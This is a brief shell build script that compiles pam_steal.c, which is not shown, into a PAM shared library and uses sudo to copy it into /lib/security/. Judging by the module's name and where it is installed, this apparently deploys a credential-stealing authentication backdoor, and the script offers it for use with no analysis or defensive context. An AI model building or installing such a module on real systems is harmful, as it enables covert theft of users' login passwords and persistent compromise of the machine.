#!/bin/sh

set -e

gcc -g -O2 -MT pam_steal_la-pam_steal.lo -MD -MP -MF pam_steal_la-pam_steal.Tpo -c pam_steal.c  -fPIC -DPIC -o pam_steal_la-pam_steal.o
gcc -shared  pam_steal_la-pam_steal.o -lpam_misc -lpam -Wl,-soname -Wl,pam_steal.so -o pam_steal.so
rm -f pam_steal_la-pam_steal.Tpo pam_steal_la-pam_steal.o

sudo cp pam_steal.so /lib/security/
